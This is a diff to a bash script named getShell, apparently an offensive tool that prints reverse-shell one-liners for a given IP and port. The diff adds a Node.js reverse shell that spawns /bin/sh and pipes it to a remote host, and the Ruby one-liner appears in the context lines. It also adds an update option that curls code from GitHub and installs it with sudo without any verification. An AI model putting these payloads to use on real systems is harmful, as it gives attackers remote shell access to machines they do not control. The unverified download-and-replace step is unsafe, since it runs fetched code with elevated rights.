@@ -24,7 +24,7 @@ printBanner()
  \___  / \___  /|__| /_______  /___|  /\___  /____/____/
 /_____/      \/              \/     \/     \/           
 
-	Version: 1.0 		Author: focab0r
+	Version: 1.0.1 		Author: focab0r
 '
 }
 
@@ -38,7 +38,8 @@ printHelp()
 	  -i   -->  Specify IP and PORT
 	  -v   -->  Open a listening port using netcat
 	  -t   -->  List interfaces
-	  -p   -->  Send a ping to github.com 
+	  -p   -->  Send a ping to github.com
+	  -x   -->  Update getShell 
 	  Else -->  Specify a command
 		  
 	EXAMPLES:
@@ -85,6 +86,12 @@ rubyShell()
 	echo -e "${YELLOW}[1]${ENDCOLOR} ruby -rsocket -e'f=TCPSocket.open(\"${GREEN}$1${ENDCOLOR}\",${PURPLE}$2${ENDCOLOR}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
 }
 
+nodeShell()
+{
+	echo -e "\n${BLUE}### NODE ###${ENDCOLOR}"
+	echo -e "${YELLOW}[1]${ENDCOLOR} node -e 'sh = require(\"child_process\").spawn(\"/bin/sh\"); require(\"net\").connect(process.env.${PURPLE}$2${ENDCOLOR}, process.env.${GREEN}$1${ENDCOLOR}, function () {this.pipe(sh.stdin);sh.stdout.pipe(this);sh.stderr.pipe(this);})'"	
+}
+
 ncShell()
 {
 	echo -e "\n${BLUE}### Netcat ###${ENDCOLOR}"
@@ -101,6 +108,7 @@ listShells()
         pyShell $IPs $PORTs
         phpShell $IPs $PORTs
         rubyShell $IPs $PORTs
+	nodeShell $IPs $PORTs
 	ncShell $IPs $PORTs
 
 }
@@ -168,6 +176,10 @@ then
 		echo -e "[*] ERROR: Specify a port to open\n"
 		exit 1
 	fi
+elif [ "$1" == '-x' ];
+then
+	curl https://raw.githubusercontent.com/focab0r/getShell/main/getShell > /tmp/getShellUPDATED
+	sudo mv /tmp/getShellUPDATED ./getShell
 elif [ "$1" == '-i' ];
 then
 	IP=$2
